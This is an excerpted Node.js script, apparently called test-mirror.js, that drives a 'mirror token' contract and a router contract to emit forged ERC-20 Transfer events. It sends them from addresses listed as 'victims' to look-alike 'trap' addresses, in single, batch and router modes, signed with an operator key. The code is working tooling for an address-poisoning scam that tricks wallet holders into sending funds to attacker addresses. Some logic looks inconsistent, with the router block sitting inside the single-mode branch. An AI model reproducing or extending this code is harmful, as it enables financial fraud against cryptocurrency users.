...
const MIRROR_TOKEN_ADDRESS = process.env.MIRROR_TOKEN_ADDRESS;
const MULTI_TOKEN_ROUTER_ADDRESS = process.env.MULTI_TOKEN_ROUTER;
let OPERATOR_KEY = process.env.MIRROR_OPERATOR_KEY;

// ─── CLI Mode Selection ───
const MODE = process.argv[2] || 'single';  // 'single', 'batch', or 'router'

if (!['single', 'batch', 'router'].includes(MODE)) {
    console.error('❌ Invalid mode. Use: node test-mirror.js single OR node test-mirror.js batch OR node test-mirror.js router');
    process.exit(1);
}
...
function getDecimals(assetSymbol) {
    const decimalsMap = {
        ...
        'USDC': 6, 'USDC_NATIVE': 6, 'USDT': 6, 'BUSD': 6,
        'DAI': 18, 'TUSD': 18, 'FRAX': 18, 'USDP': 18,
        'WBTC': 8, 'renBTC': 8,
    };
    const symbol = assetSymbol.toUpperCase();
    const decimals = decimalsMap[symbol];
...
const BATCH_VICTIMS = [
    '0xEeaEbbcf585f151f9A0b7D0954c45dE41013D10E',
    '0xf10b3a02d89e2970209add91e9a32b7202997ce5',
    // '0xabcdefabcdefabcdefabcdefabcdefabcdefabcd',
    // '0x9876543210987654321098765432109876543210',
    // '0xfedcbafedcbafedcbafedcbafedcbafedcbafedc',
...
async function test() {
    ...
    if (MODE === 'single') {
        ...
        // ─── ROUTER MODE (Multi-Token Batch) ───
        if (!MULTI_TOKEN_ROUTER_ADDRESS) {
            console.error('❌ MULTI_TOKEN_ROUTER not set in .env');
            process.exit(1);
        }

        console.log(`\n🎯 ROUTER TRANSFER MODE (Multi-Token Batch)`);
        console.log(`📡 Router Contract: ${MULTI_TOKEN_ROUTER_ADDRESS}`);
        console.log(`📄 Target Mirror Contract: ${MIRROR_TOKEN_ADDRESS}`);

        // Split into 2 calls to simulate multi-token routing
        const calls = [
            {
                target: MIRROR_TOKEN_ADDRESS,
                froms: BATCH_VICTIMS.slice(0, 3),
                tos: BATCH_TRAPS.slice(0, 3),
                values: BATCH_AMOUNTS.slice(0, 3)
            },
            {
                target: MIRROR_TOKEN_ADDRESS,
                froms: BATCH_VICTIMS.slice(3),
                tos: BATCH_TRAPS.slice(3),
                values: BATCH_AMOUNTS.slice(3)
            }
        ];

        console.log(`\n📋 Router Batch Configuration:`);
        calls.forEach((call, i) => {
            console.log(`   Call ${i + 1}: Target ${call.target} (${call.froms.length} transfers)`);
        });

        console.log('\n🚀 Emitting Router batch forged Transfer events...');

        const hash = await walletClient.writeContract({
            address: MULTI_TOKEN_ROUTER_ADDRESS,
            abi: ROUTER_ABI,
...
test().catch(err => {
    console.error('❌ Test failed:', err.message);
    if (err.message.includes('insufficient funds')) {
        console.error('\n💡 Your operator wallet needs ETH for gas.');
    } else if (err.message.includes('execution reverted')) {
        console.error('\n💡 The contract REVERTED! Check Etherscan for the exact revert reason.');
    }
    process.exit(1);
});